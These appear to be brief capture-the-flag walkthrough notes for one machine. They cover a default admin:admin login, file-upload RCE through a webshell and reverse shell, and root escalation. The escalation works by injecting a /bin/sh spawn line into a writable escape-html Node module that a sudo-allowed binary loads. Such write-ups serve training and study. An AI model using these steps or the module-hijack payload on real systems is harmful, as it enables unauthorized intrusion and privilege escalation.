there is only port 80 open

there is a login page on the landing page

the credentials are admin:admin

This app uses the codekop software

There is a RCE via file upload vulnerability on this app

Upload a webshell, then use it to upload a reverse shell file

Once on, we have sudo access to the this binary:
/usr/local/bin/escaper

The binary is a symlink to a Node JS index.js file, which has the following code:

#!/usr/bin/node
var express = require('express');
var escape = require('escape-html');
var args = process.argv.slice(2);
var html = escape(args[0]);

The escape-html module has write permissions on its index.js file, so we inject this code:

require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})

To this file

/opt/app/node_modules/escape-html/index.js

Finis
